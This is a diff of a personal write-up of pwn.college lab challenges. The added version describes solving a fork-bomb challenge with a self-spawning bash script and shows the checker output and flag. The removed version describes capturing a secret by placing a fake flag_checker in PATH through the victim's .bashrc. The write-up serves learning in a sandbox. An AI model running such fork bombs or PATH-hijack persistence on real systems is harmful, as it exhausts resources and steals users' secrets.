@@ -17,27 +17,33 @@ This challenge contains a /challenge/check that'll try to determine if your fork
 NOTE: Needless to say, this will render your environment unusable. Just restart the challenge (or start a different one) to get things back to a usable state!
 
 ### Solve
-**Flag:** `pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}`
+**Flag:** `pwn.college{E-OgQsOo-gl3giHeM4qk5KJrxVg.0VMyEzNxwiNyUDN0EzW}`
 
-This challenge combined two concepts from earlier modules: modifying a user's .bashrc file and hijacking commands through PATH. Instead of stealing a file, the goal was to intercept a secret that Zardus manually entered into the flag_checker program. A fake flag_checker script was created that displayed the expected prompt (Type the flag) and then echoed whatever input it received. The victim's .bashrc was modified to place the directory containing the fake program at the front of PATH. When Zardus logged in and executed flag_checker, the shell found and launched the malicious version instead of the real one, causing the flag to be printed back to the screen.
+This challenge demonstrated a fork bomb by recursively spawning copies of the same script in the background. The script launched two new instances of itself using &, causing exponential process growth. Once enough processes were created, the system could no longer spawn new ones, and /challenge/check detected the exhausted process table and revealed the flag.
 
 ```bash
-hacker@shenanigans~sniffing-input:~$ mkdir ~/evil
-hacker@shenanigans~sniffing-input:~$ nano ~/evil/flag_checker
-(#!?bin/bash
-echo "Type the flag"
-cat)
-hacker@shenanigans~sniffing-input:~$ chmod +x ~/evil/flag_checker
-hacker@shenanigans~sniffing-input:~$ echo 'PATH=/home/hacker/evil:$PATH' >> /home/zardus/.bashrc
-hacker@shenanigans~sniffing-input:~$ /challenge/victim
-Username: zardus
-zardus@shenanigans~sniffing-input:~$ ***********
--bash: 1498726685: command not found
-zardus@shenanigans~sniffing-input:~$ flag_checker
+hacker@destruction~the-fork-bomb:~$ nano bomb.sh
+(#!/bin/bash
+./bomb.sh &
+./bomb.sh &)
+hacker@destruction~the-fork-bomb:~$ chmod +x bomb.sh
+hacker@destruction~the-fork-bomb:~$ ./bomb.sh
 
-Type the flag
-*************************************************************pwn.college{4KJrUijph2pPaiqOSQNdt0S-otI.0VNzEzNxwiNyUDN0EzW}
+hacker@destruction~the-fork-bomb:~$ /challenge/check
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+It looks like the system can still spawn processes. We'll check again in 5 seconds...
+You successfully saturated the process table.  Here is your hard-earned flag:
+pwn.college{E-OgQsOo-gl3giHeM4qk5KJrxVg.0VMyEzNxwiNyUDN0EzW}
 ```
 
 ### New Learnings
-Learned how command hijacking can be used to intercept sensitive user input rather than simply execute malicious commands. Reinforced the importance of the PATH variable in determining which executable is launched when a command name is entered. Also gained experience combining startup-script persistence (.bashrc) with PATH manipulation to replace a legitimate program with a malicious lookalike, demonstrating a classic technique used by attackers to capture credentials, secrets, and other user-provided data.
+Learned how a fork bomb works by recursively creating processes faster than the operating system can manage them. Reinforced the concept that every program execution creates a process and that system resources include not only disk space and memory but also available process slots. Also gained practical experience using background execution (&) and observing the effects of process exhaustion through fork failures and system slowdowns.
